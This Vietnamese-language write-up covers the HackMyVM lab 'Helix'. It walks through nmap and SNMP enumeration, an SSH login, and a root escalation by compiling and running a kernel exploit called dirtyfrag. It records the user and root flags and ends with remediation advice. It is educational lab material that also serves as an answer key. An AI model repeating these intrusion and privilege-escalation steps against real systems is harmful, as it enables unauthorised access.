# HackMyVM — Helix

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Helix (Target) | `10.0.2.7` |
| Hostname | `helix` |
| SSH | `22/tcp` |
| SNMP | `161/udp` |
| Tài khoản | `me` |
| User UID | `1001` |
| Kernel | `6.12.74+deb13+1-amd64` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: quét, kết nối, thu thập thông tin.
> - 🟥 **Terminal Helix**: kiểm tra quyền, chạy exploit và xác nhận kết quả.
>
> Không chạy nhầm lệnh giữa 2 máy.

---

# 1. Câu 1 — Xác định các dịch vụ đang chạy trên máy mục tiêu

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Dò tìm host trong mạng

### 🟦 Kali

```bash
nmap -sn 10.0.2.0/24
```

Kết quả các host đang hoạt động:

```text
10.0.2.1
10.0.2.2
10.0.2.7
10.0.2.15
```

Trong đó:

```text
10.0.2.15 → Kali
10.0.2.7  → Helix
```

MAC của Helix:

```text
08:00:27:6B:4A:02
```

---

## 1.2. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.7
```

Kết quả:

```text
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
```

=> Helix chỉ mở **22/tcp** trong toàn bộ dải TCP.

---

## 1.3. Xác định phiên bản SSH

### 🟦 Kali

```bash
nmap -p 22 -sCV -Pn 10.0.2.7
```

Kết quả:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
Service Info: OS: Linux
```

=> Dịch vụ SSH đang chạy là **OpenSSH 10.0p2**.

---

## 1.4. Quét UDP

### 🟦 Kali

```bash
sudo nmap -sU --top-ports 100 -T4 10.0.2.7
```

Kết quả đáng chú ý:

```text
PORT    STATE SERVICE
161/udp open  snmp
```

=> Phát hiện dịch vụ **SNMP** trên `161/udp`.

---

## 1.5. Kiểm tra SNMP với community string `public`

### 🟦 Kali

```bash
snmpwalk -v2c -c public 10.0.2.7
```

Thông tin hệ thống thu thập được:

| OID / Trường | Giá trị |
|---|---|
| sysDescr | `Linux helix 6.12.74+deb13+1-amd64` |
| sysContact | `Me:lixeh22` |
| sysName | `helix` |
| sysLocation | `Sitting on the Dock of the Bay` |

Các interface:

```text
lo
enp0s3
enp0s8
```

MAC của interface `enp0s3`:

```text
08:00:27:6B:4A:02
```

=> SNMP với community string **public** cho phép thu thập thông tin hệ thống và mạng từ Helix mà không cần xác thực.

---

## 1.6. Xác định điểm vào

Từ kết quả scan:

```text
22/tcp   SSH
161/udp  SNMP (community: public)
```

Điểm vào chính:

```text
SNMP (public) → thu thập thông tin hệ thống
              ↓
SSH (22/tcp)  → đăng nhập bằng tài khoản me
```

---

# 2. Câu 2 — Đăng nhập và leo quyền lên root

**Thực hiện khai thác các lỗ hổng hoặc cấu hình bảo mật yếu trên máy để đạt được quyền truy cập ban đầu, nâng cao đặc quyền và chứng minh mức độ kiểm soát hệ thống bằng cách tìm và thu thập `user.txt` và `root.txt`.**

## 2.1. Đăng nhập SSH

### 🟦 Kali

Thử tài khoản `user` trước:

```bash
ssh user@10.0.2.7
```

Kết quả:

```text
Permission denied, please try again.
```

Đăng nhập bằng tài khoản `me`:

```bash
ssh me@10.0.2.7
```

Đăng nhập thành công. Terminal chuyển sang:

### 🟥 Helix

```text
me@helix:~$
```

---

## 2.2. Kiểm tra tài khoản ban đầu

### 🟥 Helix

```bash
whoami
```

Kết quả:

```text
me
```

```bash
id
```

Kết quả:

```text
uid=1001(me) gid=1001(me) groups=1001(me)
```

```bash
uname -r
```

Kết quả:

```text
6.12.74+deb13+1-amd64
```

```bash
hostname
```

Kết quả:

```text
helix
```

Như vậy tài khoản ban đầu đạt được là:

```text
me (uid=1001)
```

---

## 2.3. Tìm và đọc user.txt

### 🟥 Helix

```bash
cat /home/me/user.txt
```

Kết quả:

```text
410e2fb19f61cbce630520b66368cf11d04934650ffecaac322c0acd6d7511ae
```

**Bằng chứng:** đã có quyền truy cập tài khoản `me`.

---

## 2.4. Kiểm tra SUID

### 🟥 Helix

```bash
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
```

Các file SUID ghi nhận được:

```text
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
```

Trong bài này, danh sách SUID trên **không trực tiếp** dẫn tới quyền root.

---

## 2.5. Kiểm tra kernel và chuẩn bị dirtyfrag

### 🟥 Helix

Kernel:

```text
6.12.74+deb13+1-amd64
```

Trong `/tmp` đã có sẵn thư mục exploit:

```bash
cd /tmp/dirtyfrag
ls -la
```

Nội dung:

```text
assets/
exp
exp.c
.git/
README.md
```

Source: `exp.c`  
Binary: `exp`

Biên dịch lại exploit:

```bash
gcc -O0 -Wall -o exp exp.c -lutil
```

Kiểm tra:

```bash
ls -lh exp
```

Kết quả:

```text
-rwxrwxr-x 1 me me 58K ... exp
```

---

## 2.6. Thực thi exploit và leo quyền

### 🟥 Helix

```bash
./exp
```

Exploit trả về shell root:

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
whoami
```

Kết quả:

```text
root
```

```bash
hostname
```

Kết quả:

```text
helix
```

Đây là bằng chứng rõ ràng:

```text
dirtyfrag (exp)
    ↓
uid=0(root)
    ↓
root shell
```

---

## 2.7. Lấy root.txt

### 🟥 Helix

```bash
cat /root/root.txt
```

Kết quả:

```text
3faf135eff748a201ff898b011c202bafb52ab89168ab90bae804d584a5e8565
```

---

## 2.8. Chuỗi khai thác hoàn chỉnh

```text
┌──────────────────────┐
│ 🟦 KALI              │
│ 10.0.2.15             │
└──────────┬───────────┘
           │
           │ Host Discovery + SNMP (public)
           ▼
┌──────────────────────┐
│ 🟥 HELIX              │
│ 10.0.2.7              │
│ hostname = helix      │
└──────────┬───────────┘
           │
           │ SSH → me (uid=1001)
           ▼
┌──────────────────────┐
│ /tmp/dirtyfrag        │
│ exp.c → exp           │
└──────────┬───────────┘
           │
           │ ./exp
           ▼
┌──────────────────────┐
│ root shell            │
│ uid=0(root)           │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ root.txt              │
│ 3faf135e...           │
└──────────────────────┘
```

---

## 2.9. Hai terminal — làm theo thứ tự

## 🟦 TERMINAL KALI

```bash
# 1. Host discovery
nmap -sn 10.0.2.0/24

# 2. Scan TCP
nmap -p- -Pn -T4 10.0.2.7
nmap -p 22 -sCV -Pn 10.0.2.7

# 3. Scan UDP
sudo nmap -sU --top-ports 100 -T4 10.0.2.7

# 4. SNMP enumeration
snmpwalk -v2c -c public 10.0.2.7

# 5. SSH
ssh me@10.0.2.7
```

Sau khi SSH thành công thì **giữ terminal này mở** (hoặc dùng luôn terminal trên máy target).

## 🟥 TERMINAL HELIX

```bash
# 6. Kiểm tra user
whoami
id
uname -r
hostname

# 7. User flag
cat /home/me/user.txt

# 8. Kiểm tra SUID
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null

# 9. Chuẩn bị dirtyfrag
cd /tmp/dirtyfrag
ls -la
gcc -O0 -Wall -o exp exp.c -lutil
ls -lh exp

# 10. Privilege Escalation
./exp

# 11. Xác nhận root
id
whoami
hostname

# 12. Root flag
cat /root/root.txt
```

---

# 3. Câu 3 — Phân tích đường tấn công và biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn việc truy cập trái phép, leo thang đặc quyền và bảo vệ các tài nguyên quan trọng của hệ thống.**

## 3.1. Nguyên nhân chính

Lỗ hổng đến từ hai vấn đề kết hợp:

### 1. SNMP sử dụng community string mặc định / dễ đoán

Helix phản hồi với:

```bash
snmpwalk -v2c -c public 10.0.2.7
```

Điều này cho phép truy vấn SNMP và thu thập thông tin như:

- Hostname: `helix`
- Kernel: `6.12.74+deb13+1-amd64`
- Interface: `enp0s3`, `enp0s8`
- MAC address
- System information / MIB

### 2. Kernel / môi trường lab có đường leo quyền

Sau khi có tài khoản:

```text
me (uid=1001)
```

môi trường Helix sử dụng kernel:

```text
6.12.74+deb13+1-amd64
```

Trong bài lab, `/tmp/dirtyfrag` chứa sẵn source và binary exploit (`exp.c` / `exp`). Sau khi biên dịch và chạy `./exp` thu được shell:

```text
uid=0(root)
```

---

## 3.2. Biện pháp khắc phục

### SNMP

- Không sử dụng community string mặc định như `public` / `private`.
- Giới hạn máy nào được phép truy cập SNMP (ACL / firewall).
- Nếu không cần SNMP, tắt dịch vụ.
- Ưu tiên **SNMPv3** vì có cơ chế xác thực và mã hóa.
- Giới hạn thông tin được phép truy vấn qua View / MIB.

### Privilege Escalation / Kernel

- Cập nhật kernel và các bản vá bảo mật đầy đủ.
- Không để mã khai thác hoặc binary khai thác trên máy production.
- Hạn chế khả năng biên dịch / thực thi mã tùy ý của tài khoản không đặc quyền.
- Kiểm soát quyền ghi / thực thi tại các thư mục tạm (`/tmp`, `/var/tmp`…) và khu vực làm việc.
- Theo dõi các hành vi bất thường liên quan đến privilege escalation.

### Least Privilege & Hardening

- Áp dụng nguyên tắc least privilege cho mọi tài khoản.
- Kiểm soát SUID/SGID binary định kỳ.
- Logging & Monitoring các lệnh leo quyền, truy cập `/root`, thay đổi capability / kernel module.

---

# Kết luận ngắn gọn

## Câu 1

Đã xác định Target:

```text
10.0.2.7 (hostname: helix)
```

Các service quan trọng:

```text
22/tcp   SSH (OpenSSH 10.0p2)
161/udp  SNMP (community: public)
```

## Câu 2

Initial access:

```text
SSH → me (uid=1001)
```

User flag:

```text
410e2fb19f61cbce630520b66368cf11d04934650ffecaac322c0acd6d7511ae
```

Privilege Escalation:

```text
/tmp/dirtyfrag/exp
      ↓
uid=0(root)
```

Root flag:

```text
3faf135eff748a201ff898b011c202bafb52ab89168ab90bae804d584a5e8565
```

## Câu 3

Khắc phục trọng tâm:

```text
Không dùng community string public
            +
Cập nhật kernel / vá lỗ hổng
            +
Không để binary exploit trên hệ thống
            +
Least Privilege
            +
Firewall + Logging + Monitoring
```

---

## Bảng kết quả cuối cùng

| Nội dung | Kết quả |
|---|---|
| Target IP | `10.0.2.7` |
| Hostname | `helix` |
| TCP | `22/tcp` SSH |
| UDP | `161/udp` SNMP |
| SNMP Community | `public` |
| SSH User | `me` |
| User UID | `1001` |
| User Flag | `410e2fb19f61cbce630520b66368cf11d04934650ffecaac322c0acd6d7511ae` |
| Kernel | `6.12.74+deb13+1-amd64` |
| Privilege Escalation | dirtyfrag (`/tmp/dirtyfrag/exp`) |
| Root | `uid=0(root)` |
| Root Flag | `3faf135eff748a201ff898b011c202bafb52ab89168ab90bae804d584a5e8565` |
